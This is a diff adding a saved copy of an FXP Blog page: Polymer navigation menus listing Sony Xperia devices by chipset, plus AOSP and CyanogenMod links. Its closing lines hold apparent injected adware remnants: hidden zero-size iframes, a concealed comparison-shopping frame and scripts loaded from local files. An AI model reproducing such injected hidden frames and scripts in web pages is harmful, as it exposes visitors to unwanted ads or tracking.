+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Xperia Z4 Tablet">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z4 Tablet</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a53-family/sony-xperia-z4-tablet/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia M4 Aqua">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia M4 Aqua</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a53-family/sony-xperia-m4-aqua/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu label="Krait-400 Family">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Krait-400 Family</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Xperia Z3">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z3</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z3/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z3 Compact">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z3 Compact</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z3-compact/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z3 Tablet Compact">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z3 Tablet Compact</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z3-tablet-compact/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z2">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z2</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z2/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z2 Tablet">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z2 Tablet</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z2-tablet/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z1">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z1</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z1/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z1 Compact">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z1 Compact</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z1-compact/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z Ultra">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z Ultra</div>
+  <a href="http://fxpblog.co/qualcomm-krait-400-family/sony-xperia-z-ultra/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu label="Cortex-A7 Family">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Cortex-A7 Family</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Xperia T2 Ultra">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia T2 Ultra</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a7-family/sony-xperia-t2-ultra/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia T3">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia T3</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a7-family/sony-xperia-t3/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia M2">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia M2</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a7-family/sony-xperia-m2/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia E3">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia E3</div>
+  <a href="http://fxpblog.co/qualcomm-cortex-a7-family/sony-xperia-e3/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu icon="device:battery-20" label="Legacy Devices">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+    <core-icon role="img" aria-label="battery-20" src="%7B%7Bsrc%7D%7D" id="icon" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M7 17v3.67C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V17H7z"></path><path fill-opacity=".3" d="M17 5.33C17 4.6 16.4 4 15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33V17h10V5.33z"></path></g></svg></core-icon>
+  
+  <div id="label">Legacy Devices</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Overview">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Overview</div>
+  <a href="http://fxpblog.co/legacy/"></a>
+</core-item><core-submenu label="Krait-200 Family Gen2">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Krait-200 Family Gen2</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Xperia Z">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-z/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia ZL">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia ZL</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-zl/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia ZR">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia ZR</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-zr/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia Z Tablet">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia Z Tablet</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-tablet-z/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia SP">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia SP</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-sp/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia L">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia L</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-l/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia M">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia M</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-2nd-gen/sony-xperia-m/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu label="Krait-200 Family Gen1">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Krait-200 Family Gen1</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Xperia T">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia T</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-1st-gen/sony-xperia-t/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia TX">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia TX</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-1st-gen/sony-xperia-tx/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Xperia V">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Xperia V</div>
+  <a href="http://fxpblog.co/qualcomm-krait-200-family-1st-gen/sony-xperia-v/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-item horizontal="" center="" layout="" label="Obsolete Devices">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Obsolete Devices</div>
+  <a href="http://fxpblog.co/obsolete/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu icon="android" label="AOSP by FXP">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+    <core-icon role="img" aria-label="android" src="%7B%7Bsrc%7D%7D" id="icon" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48C13.85 1.23 12.95 1 12 1c-.96 0-1.86.23-2.66.63L7.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31C6.97 3.26 6 5.01 6 7h12c0-1.99-.97-3.75-2.47-4.84zM10 5H9V4h1v1zm5 0h-1V4h1v1z"></path></g></svg></core-icon>
+  
+  <div id="label">AOSP by FXP</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Android 5.1">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Android 5.1</div>
+  <a href="http://fxpblog.co/aosp/aosp-5-1/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Android 5.0">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Android 5.0</div>
+  <a href="http://fxpblog.co/aosp/aosp-5-0/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu icon="bug-report" label="CyanogenMod">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+    <core-icon role="img" aria-label="bug-report" src="%7B%7Bsrc%7D%7D" id="icon" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M20 8h-2.81c-.45-.78-1.07-1.45-1.82-1.96L17 4.41 15.59 3l-2.17 2.17C12.96 5.06 12.49 5 12 5c-.49 0-.96.06-1.41.17L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8zm-6 8h-4v-2h4v2zm0-4h-4v-2h4v2z"></path></g></svg></core-icon>
+  
+  <div id="label">CyanogenMod</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="CyanogenMod 12">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">CyanogenMod 12</div>
+  <a href="http://fxpblog.co/cyanogenmod/cyanogenmod-12/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="CyanogenMod 11">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">CyanogenMod 11</div>
+  <a href="http://fxpblog.co/cyanogenmod/cyanogenmod-11/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu>
+  
+
+</core-menu>
+      </div>
+
+      <div class="hidden" id="dropShadow"></div>
+
+    </div>
+
+  </div>
+
+</core-header-panel>
+
+    </div>
+    </div>
+  </core-selector>
+
+</core-drawer-panel>
+
+</core-scaffold>
+
+
+<div style="display:none;" id="__fghjktghndfgt_once"></div><div style="display:none;" id="__if72ru4sdfsdfrkjahiuyi_once"></div><div style="display:none;" id="__hggasdgjhsagd_once"></div><iframe replaced="true" s15822617355930755353="true" height="0" width="0"></iframe><script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/hotels.htm"></script><iframe replaced="true" s15822617355930755353="true" height="0" width="0"></iframe><iframe replaced="true" s15822617355930755353="true" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/sg_sf.htm" style="position: fixed; right: 0px; bottom: 0px; border: medium none; margin: 0px; padding: 0px; z-index: 2147483647; display: none;" id="comparison_shopping_sf_id" height="0" width="0"></iframe><iframe replaced="true" s15822617355930755353="true" style="display: none; visibility: hidden;"></iframe><iframe replaced="true" s15822617355930755353="true" style="display: none; visibility: hidden;"></iframe><script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/p"></script></body></html>
